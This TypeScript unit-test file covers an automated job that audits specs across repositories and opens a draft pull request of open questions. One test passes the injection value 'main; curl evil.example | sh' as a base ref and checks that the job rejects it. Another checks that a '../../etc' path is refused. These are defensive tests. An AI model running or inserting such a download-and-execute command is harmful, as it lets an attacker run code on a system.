// Run-level unit tests for `org-spec-audit` — drive the run against the
// in-memory test runtime (`makeCFRuntimeTest`) with seeded config + sandbox +
// model fakes. No CF, no Docker, no model provider.

import { it } from "@effect/vitest";
import { Effect } from "effect";
import { describe, expect } from "vitest";
import { makeCFRuntimeTest } from "@fractalboxdev/flare-dispatch-core/testing";
import type { ModelCompletionResult } from "@fractalboxdev/flare-dispatch-core";
import { mergeAcrossRepos, orgSpecAudit, parseWindowHours, renderMessage } from "./org-spec-audit";

const firedAt = Date.UTC(2026, 7, 8); // 2026-08-08
const input = { firedAt } as const;

/** A tools-mode model result returning the `report_open_questions` payload. */
const reported = (questions: unknown[]): ModelCompletionResult => ({
  toolCalls: [{ name: "report_open_questions", arguments: { questions } }],
  text: "",
});

const question = (over: Record<string, unknown> = {}) => ({
  group: "decide",
  question: "Does the dispatcher still commit to per-run spend caps?",
  evidence: "specs/runs.md says every run declares a cap; no source declares one.",
  specPath: "specs/runs.md",
  assumption: "keep the spec, mark the section Planned",
  key: "per-run-spend-caps",
  ...over,
});

const baseConfig = {
  "org-spec-audit.repos": "owner/alpha owner/beta",
  "org-spec-audit.control-repo": "owner/control",
  "org-spec-audit.workers-ai.model": "@cf/meta/llama-3.3-70b-instruct-fp8-fast",
};

/** `baseConfig` with one key genuinely absent — not present-and-undefined. */
const withoutKey = (config: Record<string, string>, drop: string): Record<string, string> =>
  Object.fromEntries(Object.entries(config).filter(([k]) => k !== drop));

/** Specs present, a file tree, and commits inside the window. */
const activeSandbox = {
  "specs/*.md": { exitCode: 0, stdout: "\n===FILE specs/runs.md===\nevery run declares a cap" },
  "head -800": { exitCode: 0, stdout: "specs/runs.md\nsrc/a.ts" },
  "git log --oneline": { exitCode: 0, stdout: "abc feat: thing" },
};

describe("org-spec-audit", () => {
  it.effect("is a no-op when the estate is unset", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { "org-spec-audit.workers-ai.model": "m" },
      sandboxProgram: activeSandbox,
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(0);
      expect(out.prOpened).toBe(false);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("merges the same question across repos into one control-plane PR", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: {
        // Both repos raise the same key — the merge is the point of sweeping.
        responses: [reported([question()]), reported([question()])],
      },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(2);
      expect(out.questionsRaised).toBe(2);
      expect(out.questionsAfterMerge).toBe(1);

      const calls = handles.github.openDraftPullRequestCalls;
      expect(calls).toHaveLength(1);
      expect(calls[0]!.repo).toBe("owner/control");
      expect(calls[0]!.headBranch).toBe("flare-dispatch/spec-audit-questions-2026-08-08");
      // The neutral default — `questions-dir` is unset in `baseConfig`, and no
      // value in this repo names any particular operator's layout.
      expect(calls[0]!.files[0]!.path).toBe("maintenance/questions/2026-08-08.md");
      // Both repos are named as sources on the single merged line.
      expect(calls[0]!.files[0]!.content).toContain("owner/alpha");
      expect(calls[0]!.files[0]!.content).toContain("owner/beta");
      expect(calls[0]!.body).toContain("auto-merge: never");
    }).pipe(Effect.provide(layer));
  });

  // The run holds no default control repo on purpose: a default is a repo
  // somebody else's deployment files pull requests against. Unset must stop the
  // run, and stop it BEFORE the sweep — an hour of model calls whose output has
  // nowhere to go is the expensive way to learn a key is missing.
  it.effect("fails when no control repo is configured, before sweeping anything", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: withoutKey(baseConfig, "org-spec-audit.control-repo"),
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      expect(JSON.stringify(exit)).toContain("org-spec-audit.control-repo");
      // Nothing was cloned, nothing was executed, nothing was proposed.
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
      expect(handles.sandbox.clones).toHaveLength(0);
      expect(handles.sandbox.execs).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("writes where `questions-dir` says, not where the run was born", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.questions-dir": "infra/loop/open-questions/" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const calls = handles.github.openDraftPullRequestCalls;
      expect(calls[0]!.files[0]!.path).toBe("infra/loop/open-questions/2026-08-08.md");
    }).pipe(Effect.provide(layer));
  });

  it.effect("refuses a questions-dir that escapes the repo root", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.questions-dir": "../../etc" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()])] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("skips a repo with no commits in the window, before any model call", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: { ...activeSandbox, "git log --oneline": { exitCode: 0, stdout: "" } },
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(0);
      expect(out.reposSkipped).toBe(2);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("stays silent when nothing needs an answer", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([]), reported([])] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(2);
      expect(out.questionsAfterMerge).toBe(0);
      expect(out.prOpened).toBe(false);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it("declares the cron the wrangler triggers must carry", () => {
    expect(orgSpecAudit.schedules?.[0]?.cron).toBe("45 5 * * *");
  });

  it.effect("refuses an estate entry that is not `owner/name`, before cloning anything", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.repos": "owner/alpha owner/.." },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      // The whole sweep stops: auditing 1 of 2 repos and reporting success is
      // how a repo drops out of the estate without anyone being told.
      expect(handles.sandbox.clones).toHaveLength(0);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("refuses a base ref carrying shell metacharacters", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.base": "main; curl evil.example | sh" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      expect(handles.sandbox.clones).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("fails a repo whose spec gather broke, rather than calling it spec-less", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: {
        ...activeSandbox,
        // A checkout that is not a git repo: the guard exits non-zero on an
        // empty stdout, which is byte-identical to a repo that genuinely has no
        // specs/ unless the exit code is read.
        "specs/*.md": { exitCode: 1, stdout: "", stderr: "not a git repository" },
      },
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(0);
      expect(out.reposSkipped).toBe(2);
      expect(out.prOpened).toBe(false);
      expect(handles.modelGateway.requests).toHaveLength(0);
      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("does not ask the model to audit specs against an empty file tree", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: {
        ...activeSandbox,
        "head -800": { exitCode: 1, stdout: "", stderr: "not a git repository" },
      },
      modelGateway: { responses: [reported([question()]), reported([question()])] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      // The tree is the half of the prompt the model contradicts the specs
      // WITH. Passing an empty one leaves it agreeing with every spec, so a
      // broken gather has to fail the repo, not proceed with half a prompt.
      expect(handles.modelGateway.requests).toHaveLength(0);
      expect(out.reposSwept).toBe(0);
      expect(out.reposSkipped).toBe(2);
      expect(out.prOpened).toBe(false);
    }).pipe(Effect.provide(layer));
  });
});

describe("mergeAcrossRepos", () => {
  const raised = (over: Record<string, unknown>) =>
    ({ ...question(), ...over }) as Parameters<typeof mergeAcrossRepos>[0][number];

  it("merges on a normalized key regardless of the model's punctuation", () => {
    const out = mergeAcrossRepos([
      raised({ repo: "o/a", key: "Per-Run Spend Caps" }),
      raised({ repo: "o/b", key: "per_run_spend_caps" }),
    ]);
    expect(out).toHaveLength(1);
    expect(out[0]!.sources.map((s) => s.repo)).toEqual(["o/a", "o/b"]);
  });

  it("counts one repo raising the same key twice as one question", () => {
    const out = mergeAcrossRepos([raised({ repo: "o/a" }), raised({ repo: "o/a" })]);
    expect(out).toHaveLength(1);
    expect(out[0]!.sources).toHaveLength(1);
  });

  it("ranks the most-shared question first", () => {
    const out = mergeAcrossRepos([
      raised({ repo: "o/a", key: "lonely" }),
      raised({ repo: "o/b", key: "shared" }),
      raised({ repo: "o/c", key: "shared" }),
    ]);
    expect(out[0]!.key).toBe("shared");
  });

  it("ranks by distinct repos, so one repo's two specs can't outrank two repos", () => {
    const out = mergeAcrossRepos([
      raised({ repo: "o/a", key: "one-repo-twice", specPath: "specs/x.md" }),
      raised({ repo: "o/a", key: "one-repo-twice", specPath: "specs/y.md" }),
      raised({ repo: "o/b", key: "two-repos" }),
      raised({ repo: "o/c", key: "two-repos" }),
    ]);
    // Both merge to 2 sources; only `two-repos` is a question the estate shares,
    // which is the entire reason this run sweeps rather than running per repo.
    expect(out[0]!.key).toBe("two-repos");
  });

  it("falls back to the question text when the model's key is junk", () => {
    const out = mergeAcrossRepos([raised({ repo: "o/a", key: "-" })]);
    expect(out[0]!.key).toContain("does-the-dispatcher");
  });
});

describe("parseWindowHours", () => {
  it("defaults when unset or nonsense", () => {
    expect(parseWindowHours(undefined)).toBe(26);
    expect(parseWindowHours("")).toBe(26);
    expect(parseWindowHours("0")).toBe(26);
    expect(parseWindowHours("-4")).toBe(26);
  });

  it("takes a positive integer", () => {
    expect(parseWindowHours("72")).toBe(72);
  });
});

describe("renderMessage", () => {
  const merged = (n: number, group: "decide" | "confirm") =>
    Array.from({ length: n }, (_unused, i) => ({
      key: `k${i}`,
      group,
      question: `Q${i}?`,
      assumption: "assume nothing changes",
      sources: [{ repo: "o/a", specPath: "specs/x.md" }],
      evidence: "spec says X, tree says Y",
    }));

  it("states what the per-group cap kept out rather than truncating silently", () => {
    const out = renderMessage({
      day: "2026-08-08",
      merged: merged(7, "decide"),
      outcomes: [{ repo: "o/a", skipped: false, questions: [] }],
      raised: 7,
    });
    expect(out).toContain("2 more in this group, not shown");
    expect(out).toContain("Below the per-group cap: 2");
  });

  it("names the repos it swept and the ones it skipped", () => {
    const out = renderMessage({
      day: "2026-08-08",
      merged: merged(1, "confirm"),
      outcomes: [
        { repo: "o/a", skipped: false, questions: [] },
        { repo: "o/dormant", skipped: true, questions: [] },
      ],
      raised: 1,
    });
    expect(out).toContain("Swept: `o/a`");
    expect(out).toContain("`o/dormant`");
  });

  it("separates a repo that failed from one that was quiet", () => {
    const out = renderMessage({
      day: "2026-08-08",
      merged: merged(1, "confirm"),
      outcomes: [
        { repo: "o/a", skipped: false, questions: [] },
        { repo: "o/dormant", skipped: true, questions: [] },
        { repo: "o/broken", skipped: true, failure: "model call failed (429)", questions: [] },
      ],
      raised: 1,
    });
    // A failure counted as "unchanged" turns an outage into good news.
    expect(out).toContain("1 unchanged or without specs");
    expect(out).toContain("1 failed");
    expect(out).toContain("Failed: `o/broken` (model call failed (429))");
    expect(out).not.toContain("Failed: none");
    // And the caveat lands above the questions, not in a footer.
    expect(out.indexOf("could not be swept")).toBeLessThan(out.indexOf("## Confirm"));
  });

  it("says so explicitly when nothing failed", () => {
    const out = renderMessage({
      day: "2026-08-08",
      merged: merged(1, "confirm"),
      outcomes: [{ repo: "o/a", skipped: false, questions: [] }],
      raised: 1,
    });
    expect(out).toContain("Failed: none");
    expect(out).not.toContain("could not be swept");
  });
});
